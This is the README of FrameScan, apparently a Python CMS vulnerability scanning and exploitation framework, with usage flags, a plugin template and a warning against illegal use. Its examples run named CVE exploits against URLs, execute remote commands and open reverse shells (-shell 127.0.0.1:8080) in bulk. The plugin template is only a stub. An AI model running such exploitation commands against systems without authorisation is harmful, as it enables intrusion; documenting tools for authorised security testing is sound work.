# FrameScan

## 工具简介

FrameScan是一款python3编写的简易的cms漏洞检测利用框架，支持漏洞检测与简单利用方式，支持大多数CMS，可以自定义CMS类型及自行编写POC。旨在帮助有安全经验的安全工程师对已知的应用快速发现漏洞。

## 支持平台

- Windows  
- Linux  
- MAC（请自测）

## 工具特点

- 单URL批量检测
- 单URL单漏洞检测
- 单URL指定CMS检测
- 多URL单漏洞检测
- 单URL单漏洞检测
- 单URL指定CMS检测
- 单URL 漏洞利用
- 多URL 漏洞利用

详细参数如下：

```

         _____                         ____
        |  ___| __ __ _ _ __ ___   ___/ ___|  ___ __ _ _ __
        | |_ | '__/ _` | '_ ` _ \ / _ \___ \ / __/ _` | '_ \
        |  _|| | | (_| | | | | | |  __/___) | (_| (_| | | | |
        |_|  |_|  \__,_|_| |_| |_|\___|____/ \___\__,_|_| |_|

    Options:                          Code by qianxiao996
    --------------------------------------------------------------
    All:
        -u          Target URL               目标URL
        -f          Load urls file           文件路径
        -m          mode:poc or exp          选择运行模式(默认POC)

    POC Mode:
        -n          Use poc name             使用单个漏洞检测POC
        -cms        Specify CMS              指定webapp or CMS类型

    EXP Mode:
        -v          Use exp name             指定漏洞EXP名称
        -cmd        RCE Command(whoami)      执行cmd命令(默认:whoami)
        -shell      Return webshell          反弹Webshell(127.0.0.1:8080)

    Search:
        -ls         List Specify CMS poc     查找关键词漏洞(匹配漏洞名称)
        -la         List CMS POC             列出指定CMS漏洞(匹配CMS)
        -l          List avalible pocs       列出所有POC

    Output:
        -txt        Save Result(txt)         输出扫描结果（txt）
        -html       Save Result(html)        输出扫描结果（html）

    Other:
        -r          Reload POC               重新加载POC
        -t          Threads                  指定线程数量，默认10
        -h          Get help                 帮助信息
        --timeout   Scan timeout time(10s)   请求超时时间(10s)

    Example:
        python3 FrameScan.py -u http://example.com -cms thinkphp
        python3 FrameScan.py -f url.txt -m exp -v CVE-2019-2729
        python3 FrameScan.py -u http://example.com:7001 -m exp -v CVE-2019-2729
        python3 FrameScan.py -f list.txt -txt results.txt
    --------------------------------------------------------------
    FrameScan  V1.6 20210521         Blog:blog.qianxiao996.cn
```


## 使用方法

下载项目

```python
git clone https://github.com/qianxiao996/FrameScan
```

安装依赖（不需要！）

```
脚本主要依赖于以下模块
import importlib
import sys,os,re
prettytable
import sqlite3,requests,threading
import queue
```

单URL批量检测

```
python3 FrameScan.py -u URL
```

单URL单漏洞检测（POC_NAME可以用 -l、-s、-la进行查询）

```
python3 FrameScan.py -u URL -n POC_NAME
```

单URL指定CMS检测

```
python3 FrameScan.py -u URL -cms CMS_NAME
```

多URL批量检测

```
python3 FrameScan.py -f 文件名
```

多URL单漏洞检测

```
python3 FrameScan.py -f 文件名  -n  POC_NAME
```

多URL指定CMS检测

```
python3 FrameScan.py -f 文件名  -cms  CMS_NAME
```

输出到TXT或者HTML文件

```
python3 FrameScan.py -u URL -txt   文件名
python3 FrameScan.py -u URL -html  文件名
```

单URL漏洞利用

```
python3 FrameScan.py -u URL -m exp -v exp_name 
python3 FrameScan.py -u URL -m exp -v exp_name -c whoami
python3 FrameScan.py -u URL -m exp -v exp_name -shell 127.0.0.1:8080  #127.0.0.1:8080为反弹shell的端口
```

多URL漏洞利用

```
python3 FrameScan.py -f 文件  -m exp -v exp_name 
python3 FrameScan.py -f 文件  -m exp -v exp_name -c whoami
python3 FrameScan.py -f 文件  -m exp -v exp_name -shell
```

## 插件模板

插件命名格式为Plugins_插件名.py。请规范编写。脚本中为示例代码。插件模板与GUI统一，可以相互调用。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests

def vuln_info():
    info={
        'vuln_name': 'POC测试漏洞',
        'vuln_referer':'http://baidu.com',
        'vuln_author':'qianxiao996',
        'vuln_description':'''漏洞描述''',
        'vuln_identifier':'''漏洞编号。''',
        'vuln_solution':'''修复建议。''',
        'ispoc':1,
        'isexp':1

    }
    return info
# url：url  hostname：主机地址  port：端口  scheme：服务
def do_poc(url,hostname,port,scheme):
    # 返回参数
    #参数一为返回的类型，参数二结果，参数三为Payload  参数四为输出的颜色（可为空）
    #Result为结果
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #其他均会输出
    result = {"type":'Result', "value":"不存在", "payload":"payload","color":"black"}
    result['value'] = '存在'
    result['payload']= 'payload'
    return result
    

# url:url   heads:自定义请求头 cookie:cookie  exp_type:两个选线（cmd,shell） exp_cmd：命令执行的命令 lhost：反弹shell的IP lport：反弹shell的端口
def do_exp(url,heads='',cookie='',exp_type='cmd',exp_cmd='whoami',lhost='127.0.0.1',lport=8888):
    # 返回参数
    # 参数一为返回的类型，参数二为返回的值，参数三为输出的颜色
    result = {"type":'Result', "value":"root", "color":"black"}
    #命令执行
    if exp_type=='cmd':
        result['value'] = "root"
        return result
    #反弹shell    
    if exp_type=='shell':
        result['type'] = "log"
        result['value'] = "反弹成功"
        result['color'] = "green"
        return result
```

欢迎投递POC

邮箱地址：qianxiao996@126.com

## 警告！
**请勿用于非法用途！否则自行承担一切后果**



```
pyinstaller -F FrameScan.py -i main.ico  --hidden-import eventlet.hubs.epolls --hidden-import eventlet.hubs.kqueue    --hidden-import  eventlet.hubs.selects --hidden-import dns --hidden-import dns.dnssec --hidden-import dns.e164  --hidden-import dns.hash  --hidden-import dns.namedict  --hidden-import   dns.tsigkeyring --hidden-import dns.update --hidden-import dns.version --hidden-import dns.zone --additional-hooks-dir=
```

